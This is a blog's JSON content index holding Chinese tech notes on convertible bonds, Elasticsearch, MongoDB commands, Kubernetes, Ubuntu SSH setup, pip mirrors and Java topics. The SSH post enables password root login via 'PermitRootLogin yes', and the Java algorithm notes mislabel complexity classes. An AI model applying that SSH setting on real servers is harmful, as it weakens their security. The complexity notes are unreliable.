https://www.jisilu.cn/data/cbnew/#pre 先价比转股甲 先价比转股价 &gt; 95% 评级 AA、AA+、AAA 可转债说明可转换是一张可以转化成股票的公司债券 可转债 债券 在可转债到期后公司需要连本带息还钱 100￥ + 利息 &gt; 100￥ 在 &lt; 100人民币 买入可保本 可转换为股票 可转债会随着股票的价格增长而增长 尽可能购买评级高的股票 防御性买入法（慢） 买入价格 &lt; 100￥ 评级 AA 级以上 进攻型买入法（快） 溢价率低于 20% 上市满足半年 价格低于 110 评级至少为 至少AA 怎么卖 上涨不卖 最高点 跌 10 元卖出","categories":[],"tags":[]},{"title":"elasticsearch 与 Head 插件","slug":"other/elasticsearch","date":"2020-04-08T00:00:00.000Z","updated":"2021-06-20T05:13:06.480Z","comments":true,"path":"2020/04/08/other/elasticsearch/","link":"","permalink":"https://www.shanghua.live/2020/04/08/other/elasticsearch/","excerpt":"","text":"基础命令 查询 进入 Head 插件 复合查询 http://localhost:9200/ _analyze POST Body &#123;&quot;analyzer&quot;:&quot;ik_smart&quot;,&quot;text&quot;:&quot;php java&quot;&#125;","categories":[],"tags":[{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://www.shanghua.live/tags/elasticsearch/"}]},{"title":"MongoDB 的安装和使用","slug":"other/MongoDB","date":"2020-04-03T15:44:15.000Z","updated":"2021-06-20T05:13:06.830Z","comments":true,"path":"2020/04/03/other/MongoDB/","link":"","permalink":"https://www.shanghua.live/2020/04/03/other/MongoDB/","excerpt":"安装 MongoDB 进入到 https://www.mongodb.com/download-center/community 即可选择符合你操作系统的安装包 按照安装包指示的流程安装即可 安装完成后将安装后的 bin 目录加入到系统 path 环境变量中","text":"安装 MongoDB 进入到 https://www.mongodb.com/download-center/community 即可选择符合你操作系统的安装包 按照安装包指示的流程安装即可 安装完成后将安装后的 bin 目录加入到系统 path 环境变量中 使用 MongoDB 创建目录 打开命令提示符 创建存放数据的目录 md d:\\data 启动服务 mongod ‐‐dbpath=d:\\data 连接 mongo 192.168.184.134 常用命令 创建数据库 use 数据库名 数据库不存在则会自动创建 use spit 插入数据 db.数据库名.insert(数据); db.spit.insert(&#123;content:&quot;aaa&quot;,userid:&quot;1011&quot;,nickname:&quot;小雅&quot;,visits:NumberInt(902)&#125;); 查询数据 db.集合名称.find(); db.spit.find(); 可以发现，每个数据库文档都会自动创建一个 _id 字段，相当于数据库的主键，我们可以插入支持的类型值替换 db.spit.insert(&#123;_id:&quot;1&quot;,content:&quot;aaa&quot;,userid:&quot;1012&quot;,nickname:&quot;小明&quot;,visits:NumberInt(2020)&#125;); 条件查询 db.spit.find(&#123;userid:&#39;1011&#39;&#125;) 查询一个 db.spit.findOne(&#123;userid:&#39;1013&#39;&#125;) 指定条数 db.spit.find().limit(3) 修改数据 db.集合名称.update(条件,修改后的数据) 修改 _id 为 1 的记录 db.spit.update(&#123;_id:&quot;1&quot;&#125;,&#123;visits:NumberInt(1000)&#125;) 修改后除了 visits 字段其他字段都不见了，我们可以使用 $set 解决 db.spit.update(&#123;_id:&quot;2&quot;&#125;,&#123;$set:&#123;visits:NumberInt(2000)&#125;&#125;) 删除数据 db.集合名称.remove(条件) 入过没条件则全部删除 慎用！ db.集合名称.remove(&#123;visits:1000&#125;) 删除 visits 为 100 的值 统计条数 db.spit.count() db.spit.count(&#123;userid:&quot;1012&quot;&#125;) 统计 userid 为 1012 的数量\\ 模糊查询 /模糊查询字符串/ db.spit.find(&#123;content:/流量/&#125;) db.spit.find(&#123;content:/^加班/&#125;) 大于 小于 不等于 db.集合名称.find(&#123; &quot;field&quot; : &#123; $gt: value &#125;&#125;) // 大于: field &gt; value db.集合名称.find(&#123; &quot;field&quot; : &#123; $lt: value &#125;&#125;) // 小于: field &lt; value db.集合名称.find(&#123; &quot;field&quot; : &#123; $gte: value &#125;&#125;) // 大于等于: field &gt;= value db.集合名称.find(&#123; &quot;field&quot; : &#123; $lte: value &#125;&#125;) // 小于等于: field &lt;= value db.集合名称.find(&#123; &quot;field&quot; : &#123; $ne: value &#125;&#125;) // 不等于: field != value 包含与不包含 db.spit.find(&#123;userid:&#123;$in:[&quot;1013&quot;,&quot;1014&quot;]&#125;&#125;) 查询 useid 字段包含 1013 和 1014 的文档 db.spit.find(&#123;userid:&#123;$nin:[&quot;1013&quot;,&quot;1014&quot;]&#125;&#125;) 查询 useid 字段不包含 1013 和 1014 的文档 条件连接 $and:[ &#123; &#125;,&#123; &#125;,&#123; &#125; ] 相当于 SQL 中的 AND db.spit.find(&#123;$and:[ &#123;visits:&#123;$gte:1000&#125;&#125; ,&#123;visits:&#123;$lt:2000&#125; &#125;]&#125;) 查询 visits 大于 1000 并且小于 2000 的文档 $or:[ &#123; &#125;,&#123; &#125;,&#123; &#125; ] 相当于 SQL 中的 OR db.spit.find(&#123;$or:[ &#123;userid:&#123;$gte:&quot;1013&quot;&#125;&#125; ,&#123;visits:&#123;$lt:2000&#125; &#125;]&#125;) 查询 userid 等于 1013 并且 visits 小于 2000 的文档 列值增长 db.spit.update(&#123;_id:&quot;2&quot;&#125;,&#123;$inc:&#123;visits:NumberInt(1)&#125;&#125;)","categories":[],"tags":[{"name":"MongoDB","slug":"MongoDB","permalink":"https://www.shanghua.live/tags/MongoDB/"}]},{"title":"K8s(kubernetes) 简介","slug":"other/k8sAbout","date":"2020-03-30T20:50:23.000Z","updated":"2021-06-20T05:13:06.663Z","comments":true,"path":"2020/03/31/other/k8sAbout/","link":"","permalink":"https://www.shanghua.live/2020/03/31/other/k8sAbout/","excerpt":"kubernetes容器编排工具，是一个开源的平台，可以实现容器集群的自动化部署，自动扩缩容，维护等功能","text":"kubernetes容器编排工具，是一个开源的平台，可以实现容器集群的自动化部署，自动扩缩容，维护等功能 快速部署应用 快速扩展应用 无缝对接新的应用功能 节省资源，优化硬件资源应用 特点 可移植 支持公有云（阿里云，腾讯云），私有云（OpenStack），混合云，多重云（多个公有云） 可扩展 模块化，插件化，可挂载，可组合 自动化 自动部署，自动重启，自动复制，自动伸缩/扩展 kubernetes 的目标是促进完善组件和工具的生态系统，已减轻应用程序在公有云或私有云运行的负担","categories":[],"tags":[{"name":"k8","slug":"k8","permalink":"https://www.shanghua.live/tags/k8/"}]},{"title":"使用 SSH 连接 Ubuntu","slug":"Linux/ubuntu-ssh","date":"2020-03-30T20:27:22.000Z","updated":"2021-06-20T05:11:39.044Z","comments":true,"path":"2020/03/31/Linux/ubuntu-ssh/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Linux/ubuntu-ssh/","excerpt":"软件准备FinalShell 软件官网 http://www.hostbuf.com/ 因为我们之前安装系统的时候已经安装过 SSH 了，这里我们直接连接就好了","text":"软件准备FinalShell 软件官网 http://www.hostbuf.com/ 因为我们之前安装系统的时候已经安装过 SSH 了，这里我们直接连接就好了 第一步查看 IP 地址，在命令行输入 ifconfig 123456789shanghua@ubuntu:~$ ifconfigens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.1.103 netmask 255.255.255.0 broadcast 192.168.1.255 inet6 fe80::20c:29ff:fe32:75e2 prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:0c:29:32:75:e2 txqueuelen 1000 (Ethernet) RX packets 29766 bytes 43406394 (43.4 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 3187 bytes 257063 (257.0 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 这里我的 IP 地址就是 192.168.1.103 打开 FinalShell 并新建一个连接 点击确定，这样我们就连接成功了 12345连接成功To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.See &quot;man sudo_root&quot; for details.shanghua@ubuntu:~$ 这里我们就获得了一个 shell 就可以直接操作虚拟机里的系统了 设置 ROOT 用户12345shanghua@ubuntu:~$ sudo passwd root[sudo] password for shanghua:Enter new UNIX password:Retype new UNIX password:passwd: password updated successfully 先输入当前用户密码，然后再输入两次 ROOT 账户密码，这样就设置成功了 切换到 ROOT 用户123shanghua@ubuntu:~$ suPassword:root@ubuntu:/home/shanghua# 我们输入 su 命令，然后再输入我们刚刚设置的 ROOT 密码就可以切换到 ROOT 用户了，我们可以从命令行看到，用户从 shanghua 变成了 root 配置 SSH 允许 ROOT 用户远程连接1root@ubuntu:/home/shanghua# vi /etc/ssh/sshd_config 12#PermitRootLogin prohibit-passwordPermitRootLogin yes 修改 SSH 配置文件，将 PermitRootLogin 后面的 prohibit-password 修改为 yes 重启 SSH 服务1root@ubuntu:/home/shanghua# service ssh restart 重启后 ssh 配置文件才会生效哦 编辑 FinalShell 连接改为 root 用户 记得改密码哦，修改完成点击确定，然后打开这个连接 12连接成功root@ubuntu:~# 这样就会发现连接上后就是 root 用户了","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.shanghua.live/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.shanghua.live/tags/Ubuntu/"}]},{"title":"python 换源","slug":"Python/python换源","date":"2020-03-30T20:27:21.000Z","updated":"2021-06-20T05:12:32.389Z","comments":true,"path":"2020/03/31/Python/python换源/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Python/python%E6%8D%A2%E6%BA%90/","excerpt":"环境 平台 Windows 10python 3","text":"环境 平台 Windows 10python 3 临时换源1pip install -i https://pypi.tuna.tsinghua.edu.cn/simple 永久换源在 %HOMEPATH%\\pip 目录下新建 pip.ini 文件，内容如下(如果没有 pip 文件夹，新建一个即可 ) 1234[global]timeout = 6000index-url = https://mirrors.aliyun.com/pypi/simple/trusted-host = mirrors.aliyun.com","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://www.shanghua.live/tags/Python/"}]},{"title":"java - 算法","slug":"Java/java-算法","date":"2020-03-30T20:27:15.000Z","updated":"2021-06-20T05:09:18.567Z","comments":true,"path":"2020/03/31/Java/java-算法/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java-%E7%AE%97%E6%B3%95/","excerpt":"排序算法分类 计算复杂度：最佳、最坏以及平均复杂度","text":"排序算法分类 计算复杂度：最佳、最坏以及平均复杂度 内存使用：空间复杂度 递归算法：排序算法中是否用到了递归 稳定性：当相同的健存在时，经过排序后，其值也保持相对的顺序（不发生变化） 比较排序：集合中的两个元素比较排序 串行或并行：是否运用串行或并行排序 时间复杂度表达式（Time Complexity） 表达式：Big O notation 常量时间：T(n) = O(1)(数组随机访问) 线性时间：T(n) = O(n)(在未排序数组中找最值) 对数时间：T(n) = O(n)(二级制搜索) 指数时间：T(n) = O(n^c)(冒泡排序、插入排序) 比较排序 冒泡排序(Bubble Sort)：最佳 O(n)、平均 O(n^2)、最坏 O(n^2) 插入排序(Insertion Sort)：最佳 O(n)、平均 O(n^2)、最坏 O(n^2) 快速排序(Quick Sort)：最佳 O(nlogn)、平均 O(nlong)、最坏 O(n^2) 合并排序(Merge Sort)：最佳 O(nlogn)、平均 O(nlong)、最坏 O(nlong) Tim 排序(Tim Sort)：最佳 O(n)、平均 O(nlong)、最坏 O(nlong) 内建实现 冒泡排序(Bubble Sort)：无 插入排序(Insertion Sort)：java.util.Arrays#megeSort （当排序集合数量小于 7 时） 快速排序(Quick Sort)：java.util.DualPivotQuicksort#sort（Since 1.7） 合并排序(Merge Sort)：java.util.Arrays#megeSort （1.7 之后需要激活） Tim 排序(Tim Sort)：java.util.TimSort （Since 1.7）","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"},{"name":"算法","slug":"算法","permalink":"https://www.shanghua.live/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"java 面向对象设计二","slug":"Java/java 面向对象设计二","date":"2020-03-30T20:27:00.000Z","updated":"2021-06-20T05:09:17.375Z","comments":true,"path":"2020/03/31/Java/java 面向对象设计二/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java%20%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%AE%BE%E8%AE%A1%E4%BA%8C/","excerpt":"Java 泛型设计泛型使用场景 编译时强类型转换 避免类型强转 实现通用算法","text":"Java 泛型设计泛型使用场景 编译时强类型转换 避免类型强转 实现通用算法 泛型类型A generic type is a generic class or interface that is parameterized over types. 调用泛型类型 实例化泛型 java 7 Diamond 类型参数命名约定 类型参数命名约定 E: 表示集合元素（Element） V: 表示数值（Value） K: 表示键（Key） T: 表示类型 可以参考 java.util.function.BiConsumer 类的写法 泛型有界类型参数 单界限 多界限 泛型方法和有界类型参数","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 函数式设计","slug":"Java/java-函数式设计","date":"2020-03-30T20:27:00.000Z","updated":"2021-06-20T05:09:17.859Z","comments":true,"path":"2020/03/31/Java/java-函数式设计/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java-%E5%87%BD%E6%95%B0%E5%BC%8F%E8%AE%BE%E8%AE%A1/","excerpt":"@Functionallnterface用于函数式接口类型声明的信息注解类型，这些接口的实例被 Lambda 表示式、方法引用或构造器引用创建。函数时接口只能有一个抽象方法，","text":"@Functionallnterface用于函数式接口类型声明的信息注解类型，这些接口的实例被 Lambda 表示式、方法引用或构造器引用创建。函数时接口只能有一个抽象方法，并排除默认方法以及声明中覆盖 Object 的公开方法的统计。同时 @Functionallnterface 不能标注在注解，类以及枚举上。如果违背以上规则，那么接口不能视为函数式接口，当标注 @Functionallnterface 后，会引起编译错误。 不过，如果任意接口满足以上函数式接口的要求，无论接口生命中是否标注 @Functionallnterface ，均能被编译器视作函数式接口。 函数式接口类型 提供类型 - Supplier&lt;T&gt; 消费类型 - Consumer&lt;T&gt; 转换类型 - Function&lt;T,R&gt; 断定类型 - Predicate&lt;T&gt; 隐藏类型 - Action 函数式接口设计Supplier&lt;T&gt; 接口定义 基本特点：只进不出 编程范式：作为方法/构造参数，方法的返回值 使用场景：数据来源，代码替代接口 Function&lt;T,R&gt; 接口定义 基本特点：有进有出 编程范式：作为方法/构造器参数 使用场景：类型转换、业务处理 Predicate&lt;T&gt; 接口定义 基本特点：boolean 类型判断 编程范式：作为方法/构造参数 使用场景：过滤、对象比较等 Stream API 设计Stream 基本操作 转换：Stream#map(Function) 过滤：Stream#filter(Predicate) 排序 Stream#sorted() Stream#sorted(Comparator) Stream 高级操作 Collect 操作 分组操作 聚合操作 flatMap 操作 reduce 操作 Stream 类型 串行 Stream（默认类型） 并行 Stream 转换并行 Stream：Stream#parallel() 是否并行 Stream：Stream#isParallel()","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 并发理论基础","slug":"Java/java-并发理论基础","date":"2020-03-30T20:27:00.000Z","updated":"2021-06-20T05:09:17.488Z","comments":true,"path":"2020/03/31/Java/java-并发理论基础/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java-%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/","excerpt":"同步实现 信号量 (Semaphores)：Linux、Solaris 屏障（Barriers）：Linux、Pthreads","text":"同步实现 信号量 (Semaphores)：Linux、Solaris 屏障（Barriers）：Linux、Pthreads 互斥（Mutex）：Linux、Pthreads 条件变量（Condition Variables）：Solaris、Pthreads 自旋锁（Spinlock）：Windows、Linux、Pthreads 读-写锁（Reader-Writer Lock）：Linux、Solaris、Pthreads 同步原语 - synchronized 锁定对象：对象（Object）和类（Class） 修饰范围：方法（Method）、代码块（Block） 特点：重进入（Reentrant） 方法 flages：ACC_SYNCHRONIZED 字节码：monitorenter 和 monitorexit 锁实现：Thin Lock、Inflated、HeavyWeight 实战演示 Java 线程死锁（Dead Lock） Java 线程集合（Starvation）","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 模块化设计","slug":"Java/java-模块化设计","date":"2020-03-30T20:27:00.000Z","updated":"2021-06-20T05:09:18.488Z","comments":true,"path":"2020/03/31/Java/java-模块化设计/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java-%E6%A8%A1%E5%9D%97%E5%8C%96%E8%AE%BE%E8%AE%A1/","excerpt":"java -verbose:class Java Compact 模块路径模块路径可能是单个 artiface，或者是多个 artiface 的目录，存在于宿主机器上。","text":"java -verbose:class Java Compact 模块路径模块路径可能是单个 artiface，或者是多个 artiface 的目录，存在于宿主机器上。 类路径（Class Path）的脆弱性 通过 artifaces 的 Class Path 区分类型 无法区分 artifaces 无法提前通知 artifaces 缺少 允许不同的 artifaces 定义在相同的 packages 定义类型 模块路径的差异性 定位整个模块而非类型 无论是运行时，还是编译时，在同一个目录下不允许出现同名模块 可读性（Readability）模块 com.foo.app 依赖 模块 com.foo.bar 和 java.sql，说明 java.sql 对 com.foo.app 是可读的。同时，java.sql 依赖 java.xml 和 java.logging 模块，然而这并不意味着 java.xml 或 java.logging 对 com.foo.app 可读。简言之，可读性无法跨层模块之家生效 Java 模块化迁移 非命名模块（Unnamed moudule） 类型加载于 ClassPath，而非具体模块，如遗留 jar 文件，暴露所有的 packages。 命名模块（Named modules） 所有正常的 Java 模块，packages 暴露受限于 exports – 自动模块（automatic module） 假设我们需要使用 Spring ListenableFuture API，它来自于 org.springframework:spring-core，由于该 jar 文件属于非命名模块，并且其 artifactid 为 spring-core，该 ID 命名的方式对于模块化名词是非法的。 我们能够在模块路径下能后使用”自动模块”替代 spring-core-*.jar 即使有 spring.core 模块 迁移分析 需要明确应用实现依赖的 JDK 模块 需要明确二方或三方 jar 所依赖的 JDK 模块 需要微服务化应用 迁移建议 凡是定义 module-info.java(module-info.class) 属于命名模块（java 9 + 模块化 artiface） java 9 之前的 artiface 属于命名模块 自动化模块 如果在 MANIFEST.MF 定义了 Automatic-Module-Name 属性，那么采用该属性值作为模块名称 否则，使用 jar 文件的名称(如果存在 “-“ 将其替换为”.”) Java 模块反射获取模块 获取模块 - Class#getModule() 模块接口 - Module 模块描述文件接口 - ModuleDescriptor","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 面向对象设计一","slug":"Java/java-面向对象设计一","date":"2020-03-30T20:27:00.000Z","updated":"2021-06-20T05:09:18.234Z","comments":true,"path":"2020/03/31/Java/java-面向对象设计一/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%AE%BE%E8%AE%A1%E4%B8%80/","excerpt":"Java 接口设计通用设计","text":"Java 接口设计通用设计 类/接口名 模式：（形容词） + 名词 举例 单名词：java.lang.String 双名词：java.util.ArrayList 形容词+名词：java.util.LinkedList 可访问性 public：开放 API 使用场景 举例：java.lang.String (默认)：仅在当前 package 下使用，属于私有 API 举例：java.io.FileSystem 四种修饰符 public (default) protected : 不能用于修饰最外层 class private : 不能用于修饰最外层 class 可继承性 final：final 不具备继承性，仅用于实现类，不能与 abstract 关键字同时修饰类 举例：java.lang.String 非 final：最常见/默认的设计手段，可继承性依赖于可访问性 举例：java.io.FileSystem 具体类设计常见场景 功能组件 HashMap 接口/抽象类实现 HashMap &lt;- AbstractMap &lt;- Map 数据对象 POJO 工具辅助 *Utils ViewHelper Helper 命名模式 前缀模式：”Default”、”Generic”、”Common”、”Basic” 后缀模式：”impl” 抽象类设计抽象类常见场景 接口通用实现（模板模式） Spring *Template AbstractList AbstractSet AbstractMap 状态/行为继承 工具类 常见模式 抽象程序介于类与接口之间（java 8+ 可完全由接口替换） 以 “Abstract” 或 “Base” 类名前缀 java.util.AbstractCollection javax.sql.rowset.BaseRowSet 接口设计接口设计常见场景 上下游系统（组件）通讯契约 API RPC 常量定义 Serializable Cloneable AutoCloseable EventListener 接口设计常见模式 无状态（Stateless） 完全抽象（&lt; Java 8） 局部抽象（Java 8+） 单一抽象（Java 8 函数式接口） 内置类设计内置类常见场景 临时数据存储类：java.lang.ThreadLocal.ThreadMap 特殊用途的 API 实现：java.util.Collection.UnmodifiableCollection Builder 模式（接口）：java.util.stream.Stream.Builder Java 枚举设计“枚举类” 枚举(enum)实际是 final class， 枚举(成员)修饰符为 public static final values 是 java 编译器做的字节码提升 场景：Java 枚举（enum）引入之前的模拟枚举实现类 模式： 成员用常量表示，并且类型为当前类型 常用关键字 final 修饰 非 public 构造器 枚举基本特性 类结构（强类型） 继承 java.lang.Enum 不可显示地继承和被继承","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"进程-线程-协程","slug":"Java/进程-线程-协程","date":"2020-03-30T20:27:00.000Z","updated":"2021-06-20T05:11:08.745Z","comments":true,"path":"2020/03/31/Java/进程-线程-协程/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/%E8%BF%9B%E7%A8%8B-%E7%BA%BF%E7%A8%8B-%E5%8D%8F%E7%A8%8B/","excerpt":"进程指计算机中已运行的程序。进程为曾经是分时系统的基本运作单位。在面向进程设计的系统中，进程是程序的基本执行实体；在面向线程设计的系统中，进程本身不是基本运行单位，而是线程的容器。程序本身只是指令、数据以及其组织形式的描述，进程才是程序的真正运行实例","text":"进程指计算机中已运行的程序。进程为曾经是分时系统的基本运作单位。在面向进程设计的系统中，进程是程序的基本执行实体；在面向线程设计的系统中，进程本身不是基本运行单位，而是线程的容器。程序本身只是指令、数据以及其组织形式的描述，进程才是程序的真正运行实例 线程操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程的实际操作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程可以并发多个线程，每条线程并行执行不同的任务。在Unix System V 及 SunOS 中也被称为轻量进程，但轻量进程更多指内核线程，而把用户线程称为线程 Java 线程Green Thread （绿色线程）java 1.2 之前的 Java Thread 实现，模拟多线程并发 Native OS Thread （原生 OS 线程）java 1.2 之后 Java Thread 实现，基于 OS 线程实现，数量映射 1:1 Java 线程编程模型 &lt; Java 5：Thread、Runnable Java 5：Executor、Future、Callable Java 7：ForkJoin Java 8：CompletionStage、CompletableFuture Java 9：Flow（Publisher、Subscriber、Subscription、Processor） Java 线程池 &lt; Java 5：自定义 Thread Pool Java 5+：ExecutorService ThreadPoolExecutor ScheduledThreadPoolExecutor Java 7+ ForkJoinPool Java 并发框架 Java 5：Java Util Concurrent Java 7：Fork/Join Java 8：CompletabFuture、RxJava、Reactor Java 9：Flow API、Reactive Streams 同步最常见的编程手段，是指任务发起和执行方在同一线程完成 异步常见的提升吞吐手段，是指任务发起方和执行方在不同线程中完成 非阻塞一种编程模型，由通知状态被动的回调执行，同步或异步执行均可 POSIX 线程POSIX 线程（英文：POSIX Threads，常被缩写为 Pthreads）是 POSIX 的线程标准，定义了创建和操纵线程的一套 API 实现 POSIX 线程标准的库常被称作 Pthreads，一般用于 Unix-like POSIX 系统，如 Linux Solaris。但是 Microsoft Windows 上的实现也存在，例如直接使用 Windows API 实现的第三方库 pthreads-w32；而利用 Windows 的 SFU/SUA 子系统，则可以直接使用微软提供的一部分原生 POSIX API - https://sourceware.org/pthreads-win32/ Java 线程状态API - java.lang.Thread.State（Since 1.5） NEW：线程已创建，尚未启动 RUNNABLE：表示线程处于可运行状态，不代表一定运行 BLOCKED：被 Monitor 锁阻塞，表示当前线程在同步锁的场景运作 WAITTING：线程处于等待状态，由 Object#wait()、Thread#join() 或 LockSupport#park() TIMED_WAITTING：线程处于规定时间内的等待状态 TERMINATED：线程执行结束 使用场景线程堆栈 工具 - jstack JMX - java.lang.management.ThreadMXBean#dumpAllThreads(boolean,boolean) API - java.lang.Thread#dumpStack() 生命周期方法 启动 - java.lang.Thread#start() 停止 - java.lang.Thread#stop() 暂停 - java.lang.Thread#suspend() 恢复 - java.lang.Thread#resume() “中止” - java.lang.Thread#interrupt()、java.lang.Thread#isInterrupted()","categories":[],"tags":[]},{"title":"Java 进程管理","slug":"Java/java-进程管理","date":"2020-03-30T20:26:00.000Z","updated":"2021-06-20T05:09:18.156Z","comments":true,"path":"2020/03/31/Java/java-进程管理/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java-%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/","excerpt":"管理当前 JVM 进程 获取当前 JVM 进程 ID 获取当前 JVM 进程启动时间","text":"管理当前 JVM 进程 获取当前 JVM 进程 ID 获取当前 JVM 进程启动时间 获取当前 JVM 进程线程数量 获取当前 JVM 内存使用情况 退出当前 JVM 进程 管理子进程 启动子进程 进程 API 主子进程 I/O 交互 阻塞进程 退出进程","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 集合便利实现","slug":"Java/java-集合便利实现","date":"2020-03-30T20:26:00.000Z","updated":"2021-06-20T05:09:17.970Z","comments":true,"path":"2020/03/31/Java/java-集合便利实现/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java-%E9%9B%86%E5%90%88%E4%BE%BF%E5%88%A9%E5%AE%9E%E7%8E%B0/","excerpt":"接口类型 单例集合接口（Collections.singleton*） 空集合接口（Collections.empty*） 转换集合接口（Collections.*、Arrays.*） 列举集合接口（*.of(…)）","text":"接口类型 单例集合接口（Collections.singleton*） 空集合接口（Collections.empty*） 转换集合接口（Collections.*、Arrays.*） 列举集合接口（*.of(…)） 单例集合接口 List: Collections.singletonList(T) Set: Collections.singleton(T) Map: Collections.singletonMap(K,V) 设计原则：不变集合（Immutable Collection）空集合接口（Collections.empty*） 枚举：Collections.emptyEnumeration() 迭代器：emptyIterator()、emptyListIterator() List：emptyList() Set：emptySet()、emptySortedSet、emptyNavigableSet() Map：emptyMap、emptySortedMap、emptyNavigableSet() 转换集合接口（Collections.*、Arrays.*） Enumeration：Collections.enumeration(Collection) List: Collections.list(Enumeration&lt;T&gt;)、Arrays.asList(T…) Set：Collections.newSetFromMap(Map&lt;E,Boolean&gt;) Queue：Collections.asLifoQueue(Deque&lt;T&gt;) HashCode：Arrays.hashCode(…) String：Arrays.toString(…) 列举集合接口 (*.of(…)) java.util.BitSet.valueOf(…) java.util.EnumSet.valueOf(…)(Since 1.5) java.util.Stream.valueOf(…) (Since 1.8) java.util.List.valueOf(…) (Since 9) java.util.Set.valueOf(…) (Since 9) java.util.Map.valueOf(…) (Since 9) 包装接口类型 同步包装接口（java.util.Collections.synchronized*） 只读包装接口（java.util.Collections.unmodifiable*) 类型安全包装接口（java.util.Collections.checked*） JAVA 集合 特殊实现 基本介绍为特殊场景设计实现，这些实现表现出非标准性能特性，使用限制或行为。 示例说明 弱引用 Map java.util.WeakHashMap java.lang.ThreadLocal.ThreadLocalMap 对象鉴定 Map java.util.identityHashMap","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 集合框架基础","slug":"Java/java-集合框架基础","date":"2020-03-30T20:26:00.000Z","updated":"2021-06-20T05:09:18.051Z","comments":true,"path":"2020/03/31/Java/java-集合框架基础/","link":"","permalink":"https://www.shanghua.live/2020/03/31/Java/java-%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80/","excerpt":"基本组成 Collection interfaces（集合接口）","text":"基本组成 Collection interfaces（集合接口） Infrastructure（基础设施） General-purppose implementations（通用实现） Abstract implementations（抽象实现） Legacy implementations（遗留实现） Convenience implementations（便利实现） Wrapper implementations（包装实现） Special-purpose implementations（特殊实现） Array Utilities（数组工具类） java.utils.Collection 接口通用接口 java.util.List java.util.Set java.util.SortedSet java.util.NavigableSet(since java 1.6) 集合实现遗留实现 java.util.Vector java.util.Stack java.util.HashTable java.util.En","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"Java 并发锁","slug":"Java/java-并发锁","date":"2019-09-18T11:57:00.000Z","updated":"2021-06-20T05:09:17.610Z","comments":true,"path":"2019/09/18/Java/java-并发锁/","link":"","permalink":"https://www.shanghua.live/2019/09/18/Java/java-%E5%B9%B6%E5%8F%91%E9%94%81/","excerpt":"","text":"并发锁 重进入锁 - ReentrantLock 重进入读写锁 - ReentrantReadWriteLock 邮票锁 - StampedLock","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 函数式基础","slug":"Java/java-函数式基础","date":"2019-08-29T11:40:00.000Z","updated":"2021-06-20T05:09:17.738Z","comments":true,"path":"2019/08/29/Java/java-函数式基础/","link":"","permalink":"https://www.shanghua.live/2019/08/29/Java/java-%E5%87%BD%E6%95%B0%E5%BC%8F%E5%9F%BA%E7%A1%80/","excerpt":"匿名内部类使用场景Java 作为一门面向对象的静态语言，其封装性能够屏蔽数据结构的细","text":"匿名内部类使用场景Java 作为一门面向对象的静态语言，其封装性能够屏蔽数据结构的细 节，从而更加关注模块的功能性。其静态性也确保了 Java 强类型的特性。随着模块功能的提升，伴随而来的是复杂度的增加，代码的语义清晰依赖与开发人员抽象和命名类的或方法的能力。尽管编程思想和设计模式能够促使编程风格趋于统一，然而大多数业务系统属于面共享过程的方式，这与面向对象编程在一定程度上存在一些冲突。Java 编程语言为了解决这个问题，引入了匿名内部类的方案。 匿名内置类基本特性 无名词类 声明位置（执行模块）： static block 实例 block 方法 构造器 并非特殊类 类名称：${package}.${declared_class}.${num}.class 基本特点 基于多态（多数基于接口编程） 实现类无需名称 允许多个抽象方法 编程局限 代码臃肿 强类型约束 接口方法升级","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"}]},{"title":"java 